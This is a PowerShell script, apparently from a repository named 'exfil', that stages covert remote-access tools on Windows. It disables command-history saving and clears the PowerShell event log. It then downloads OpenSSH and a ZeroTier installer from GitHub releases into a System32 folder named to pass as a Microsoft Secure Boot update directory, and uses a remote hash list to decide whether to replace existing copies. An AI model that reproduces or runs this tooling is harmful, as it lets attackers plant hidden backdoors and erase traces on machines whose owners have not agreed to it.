#SSH DL
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$downloadUrl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/OpenSSHZip.zip"
$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
function Write-VerboseMessage($message) {
    if ($VerboseOutput) {
        Write-Host $message
    }
}
if (-not (Test-Path (Split-Path $destinationPath))) {
    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
}
if (Test-Path $destinationPath) {
    $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
    $hashesData = (Invoke-WebRequest -Uri $hashesUrl -UseBasicParsing).Content
    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
    if ($hashesData -match $hashRegex) {
        $programHash = $matches[1]
    }
    if ($programHash -eq $existingFileHash) {
        Write-VerboseMessage "File is already present and matches the hash. No action needed." | Out-Null
    }
    else {
        Remove-Item -Path $destinationPath -Force
    }
}
if (-not (Test-Path $destinationPath)) {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
}
#Zt Dl
$downloadUrl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/ZeroTierOne.msi"
$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
if (-not (Test-Path (Split-Path $destinationPath))) {
    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
}
if (Test-Path $destinationPath) {
    $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
    $hashesData = (Invoke-WebRequest -Uri $hashesUrl -UseBasicParsing).Content
    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
    if ($hashesData -match $hashRegex) {
        $programHash = $matches[1]
    }
    if ($programHash -eq $existingFileHash) {
        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
    }
    else {
        Remove-Item -Path $destinationPath -Force
    }
}
if (-not (Test-Path $destinationPath)) {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
}
